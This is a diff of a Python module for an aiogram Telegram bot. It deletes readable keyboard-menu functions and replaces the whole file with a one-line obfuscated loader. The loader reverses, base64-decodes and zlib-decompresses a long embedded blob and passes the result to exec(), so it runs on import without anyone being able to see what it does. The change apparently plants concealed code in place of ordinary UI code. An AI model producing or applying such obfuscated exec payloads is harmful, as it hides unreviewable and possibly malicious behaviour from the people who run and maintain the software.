@@ -1,24 +1,2 @@
-from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
-
-def main_menu(auto_accept):
-    b = ReplyKeyboardBuilder()
-    b.button(text="📖 История")
-    b.button(text="🔄 Рестарт")
-    # Используем минималистичные индикаторы
-    status = "🟢 ON" if auto_accept else "🔴 OFF"
-    b.button(text=f"Автопринятие: {status}")
-    b.adjust(2, 1)
-    return b.as_markup(resize_keyboard=True)
-
-def call_menu(ch_id, msg_id):
-    b = InlineKeyboardBuilder()
-    b.button(text="Принять (10-4)", callback_data=f"ok_{ch_id}_{msg_id}")
-    return b.as_markup()
-
-def manage_menu(th_id, msg_id):
-    b = InlineKeyboardBuilder()
-    # Компактные кнопки управления
-    b.button(text="📍 10-20?", callback_data=f"m20_{th_id}_{msg_id}")
-    b.button(text="❌ 10-0", callback_data=f"m00_{th_id}_{msg_id}")
-    b.adjust(2)
-    return b.as_markup()
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
+exec((_)(b'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'))
